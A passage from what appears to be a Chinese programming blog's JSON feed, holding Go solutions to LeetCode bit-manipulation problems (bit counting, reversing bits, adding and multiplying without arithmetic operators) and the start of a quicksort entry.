data-num=\"17\"></td><td><pre>\t\t\t\t\twrite<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">for</span> j <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>write<span class=\"token operator\">-</span>tempWrite<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t\t\tchars<span class=\"token punctuation\">[</span>tempWrite<span class=\"token operator\">+</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> chars<span class=\"token punctuation\">[</span>write<span class=\"token operator\">-</span>j<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> chars<span class=\"token punctuation\">[</span>write<span class=\"token operator\">-</span>j<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> chars<span class=\"token punctuation\">[</span>tempWrite<span class=\"token operator\">+</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\tpre <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">return</span> write</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "算法训练2023",
                "数据结构",
                "算法"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/11_BitOperations/",
            "url": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/11_BitOperations/",
            "title": "11-位运算",
            "date_published": "2023-11-29T14:00:00.000Z",
            "content_html": "<h1 id=\"位运算\"><a class=\"anchor\" href=\"#位运算\">#</a> 位运算</h1>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">bitOperV1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">var</span> a <span class=\"token builtin\">uint8</span> <span class=\"token operator\">=</span> <span class=\"token number\">60</span> <span class=\"token comment\">/* 60 = 0011 1100 */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">var</span> b <span class=\"token builtin\">uint8</span> <span class=\"token operator\">=</span> <span class=\"token number\">13</span> <span class=\"token comment\">/* 13 = 0000 1101 */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">var</span> c <span class=\"token builtin\">uint8</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">var</span> ab <span class=\"token builtin\">byte</span> <span class=\"token operator\">=</span> <span class=\"token number\">0b00111100</span> <span class=\"token comment\">// 二进制</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">var</span> ax <span class=\"token builtin\">byte</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x3C</span>       <span class=\"token comment\">// 十六进制</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">var</span> ao <span class=\"token builtin\">byte</span> <span class=\"token operator\">=</span> <span class=\"token number\">0o74</span>       <span class=\"token comment\">// 八进制</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a == ab: %v\\n\"</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">==</span> ab<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a == ax: %v\\n\"</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">==</span> ax<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a == ao: %v\\n\"</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">==</span> ao<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tc <span class=\"token operator\">=</span> a <span class=\"token operator\">&amp;</span> b <span class=\"token comment\">/* 12 = 0000 1100 */</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第一行 - c 的值为 %d \\t二进制: %b\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tc <span class=\"token operator\">=</span> a <span class=\"token operator\">|</span> b <span class=\"token comment\">/* 61 = 0011 1101 */</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第二行 - c 的值为 %d \\t二进制: %b\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tc <span class=\"token operator\">=</span> a <span class=\"token operator\">^</span> b <span class=\"token comment\">/* 49 = 0011 0001 */</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第三行 - c 的值为 %d \\t二进制: %b\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tc <span class=\"token operator\">=</span> a <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span> <span class=\"token comment\">/* 240 = 1111 0000 */</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第四行 - c 的值为 %d \\t二进制: %b\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tc <span class=\"token operator\">=</span> a <span class=\"token operator\">>></span> <span class=\"token number\">2</span> <span class=\"token comment\">/* 15 = 0000 1111 */</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第五行 - c 的值为 %d \\t二进制: %b\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a <span class=\"token operator\">==</span> ab: <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a <span class=\"token operator\">==</span> ax: <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>a <span class=\"token operator\">==</span> ao: <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>第一行 - c 的值为 <span class=\"token number\">12</span>    二进制: <span class=\"token number\">1100</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>第二行 - c 的值为 <span class=\"token number\">61</span>    二进制: <span class=\"token number\">111101</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>第三行 - c 的值为 <span class=\"token number\">49</span>    二进制: <span class=\"token number\">110001</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>第四行 - c 的值为 <span class=\"token number\">240</span>   二进制: <span class=\"token number\">11110000</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>第五行 - c 的值为 <span class=\"token number\">15</span>    二进制: <span class=\"token number\">1111</span></pre></td></tr></table></figure><h2 id=\"算法题\"><a class=\"anchor\" href=\"#算法题\">#</a> 算法题</h2>\n<h3 id=\"1-位1的个数\"><a class=\"anchor\" href=\"#1-位1的个数\">#</a> 1. 位 1 的个数</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9udW1iZXItb2YtMS1iaXRzLw==\">https://leetcode.cn/problems/number-of-1-bits/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTFfQml0T3BlcmF0aW9ucy9sZXZlbF8yL3RvcGljXzEuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/11_BitOperations/level_2/topic_1.go</span></p>\n<blockquote>\n<p>编写一个函数，输入是一个无符号整数（以二进制串的形式），返回其二进制表达式中数字位数为 '1' 的个数</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">hammingWeight</span><span class=\"token punctuation\">(</span>num <span class=\"token builtin\">uint32</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">for</span> num <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\tnum <span class=\"token operator\">=</span> num <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>num <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\tans<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">return</span> ans</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"2-比特位计数\"><a class=\"anchor\" href=\"#2-比特位计数\">#</a> 2. 比特位计数</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9jb3VudGluZy1iaXRzLw==\">https://leetcode.cn/problems/counting-bits/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTFfQml0T3BlcmF0aW9ucy9sZXZlbF8yL3RvcGljXzIuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/11_BitOperations/level_2/topic_2.go</span></p>\n<blockquote>\n<p>给你一个整数  <code>n</code>  ，对于  <code>0 &lt;= i &lt;= n</code>  中的每个  <code>i</code>  ，计算其二进制表示中 <strong> <code>1</code>  的个数</strong> ，返回一个长度为  <code>n + 1</code>  的数组  <code>ans</code>  作为答案。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">countBits</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tdp <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> n<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\thighBit <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\thighBit <span class=\"token operator\">=</span> i</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tdp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> dp<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>highBit<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">return</span> dp</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"3-颠倒二进制位\"><a class=\"anchor\" href=\"#3-颠倒二进制位\">#</a> 3. 颠倒二进制位</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9yZXZlcnNlLWJpdHMvZGVzY3JpcHRpb24v\">https://leetcode.cn/problems/reverse-bits/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTFfQml0T3BlcmF0aW9ucy9sZXZlbF8yL3RvcGljXzMuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/11_BitOperations/level_2/topic_3.go</span></p>\n<blockquote>\n<p>颠倒给定的 32 位无符号整数的二进制位。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 将整数 n 向右移动一位并与 m1 进行按位与操作，然后将结果与 n 向左移动一位并与 m1 进行按位与操作的结果进行按位或操作。这一步交换了相邻的位。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 将上一步的结果向右移动两位并与 m2 进行按位与操作，然后将结果与上一步的结果向左移动两位并与 m2 进行按位与操作的结果进行按位或操作。这一步交换了每两位的块。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 将上一步的结果向右移动四位并与 m4 进行按位与操作，然后将结果与上一步的结果向左移动四位并与 m4 进行按位与操作的结果进行按位或操作。这一步交换了每四位的块。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 将上一步的结果向右移动八位并与 m8 进行按位与操作，然后将结果与上一步的结果向左移动八位并与 m8 进行按位与操作的结果进行按位或操作。这一步交换了每八位的块。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 将上一步的结果向右移动 16 位，并将结果与上一步的结果向左移动 16 位的结果进行按位或操作，完成整个整数的二进制位颠倒。</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tm1 <span class=\"token operator\">=</span> <span class=\"token number\">0b01010101010101010101010101010101</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tm2 <span class=\"token operator\">=</span> <span class=\"token number\">0b00110011001100110011001100110011</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tm4 <span class=\"token operator\">=</span> <span class=\"token number\">0b00001111000011110000111100001111</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tm8 <span class=\"token operator\">=</span> <span class=\"token number\">0b00000000111111110000000011111111</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">reverseBits</span><span class=\"token punctuation\">(</span>num <span class=\"token builtin\">uint32</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">uint32</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tnum <span class=\"token operator\">=</span> num<span class=\"token operator\">>></span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>m1 <span class=\"token operator\">|</span> num<span class=\"token operator\">&amp;</span>m1<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tnum <span class=\"token operator\">=</span> num<span class=\"token operator\">>></span><span class=\"token number\">2</span><span class=\"token operator\">&amp;</span>m2 <span class=\"token operator\">|</span> num<span class=\"token operator\">&amp;</span>m2<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tnum <span class=\"token operator\">=</span> num<span class=\"token operator\">>></span><span class=\"token number\">4</span><span class=\"token operator\">&amp;</span>m4 <span class=\"token operator\">|</span> num<span class=\"token operator\">&amp;</span>m4<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tnum <span class=\"token operator\">=</span> num<span class=\"token operator\">>></span><span class=\"token number\">8</span><span class=\"token operator\">&amp;</span>m8 <span class=\"token operator\">|</span> num<span class=\"token operator\">&amp;</span>m8<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">return</span> num<span class=\"token operator\">>></span><span class=\"token number\">16</span> <span class=\"token operator\">|</span> num<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"4-两整数之和\"><a class=\"anchor\" href=\"#4-两整数之和\">#</a> 4. 两整数之和</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9zdW0tb2YtdHdvLWludGVnZXJzLw==\">https://leetcode.cn/problems/sum-of-two-integers/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTFfQml0T3BlcmF0aW9ucy9sZXZlbF8yL3RvcGljXzQuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/11_BitOperations/level_2/topic_4.go</span></p>\n<blockquote>\n<p>给你两个整数  <code>a</code>  和  <code>b</code>  ，<strong>不使用</strong> 运算符  <code>+</code>  和  <code>-</code>  ，计算并返回两整数之和。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">getSum</span><span class=\"token punctuation\">(</span>a <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">for</span> b <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\tcarry <span class=\"token operator\">:=</span> <span class=\"token function\">uint</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">&amp;</span>b<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\ta <span class=\"token operator\">=</span> a <span class=\"token operator\">^</span> b</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\tb <span class=\"token operator\">=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>carry<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">return</span> a</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"5-递归乘法\"><a class=\"anchor\" href=\"#5-递归乘法\">#</a> 5. 递归乘法</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9yZWN1cnNpdmUtbXVsaXRwbHktbGNjaS9kZXNjcmlwdGlvbi8=\">https://leetcode.cn/problems/recursive-mulitply-lcci/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTFfQml0T3BlcmF0aW9ucy9sZXZlbF8yL3RvcGljXzUuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/11_BitOperations/level_2/topic_5.go</span></p>\n<blockquote>\n<p>递归乘法。 写一个递归函数，不使用 * 运算符， 实现两个正整数的相乘。可以使用加号、减号、位移，但要吝啬一些。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">multiply</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">,</span> B <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// A == min</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">if</span> A <span class=\"token operator\">></span> B <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\tA<span class=\"token punctuation\">,</span> B <span class=\"token operator\">=</span> B<span class=\"token punctuation\">,</span> A</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> A <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>A <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\tans <span class=\"token operator\">+=</span> B <span class=\"token operator\">&lt;&lt;</span> i</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\tA <span class=\"token operator\">>>=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> ans</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "算法训练2023",
                "数据结构",
                "算法"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/10_QuickSort/",
            "url": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/10_QuickSort/",
            "title": "10-快速排序",
            "date_published": "2023-11-29T11:00:00.000Z",
            "content_html": "<h1 id=\"快速排序\"><a class=\"anchor\" href=\"#快速排序\">#</a> 快速排序</h1>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 快速排序 填坑法</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">quickSortV1</span><span class=\"token punctuation\">(</span>nums <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> nums</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tp <span class=\"token operator\">:=</span> <span class=\"token function\">partionV1</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token function\">quickSortV1</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token function\">quickSortV1</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>p<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">return</span> nums</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">partionV1</span><span class=\"token punctuation\">(</span>nums <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td 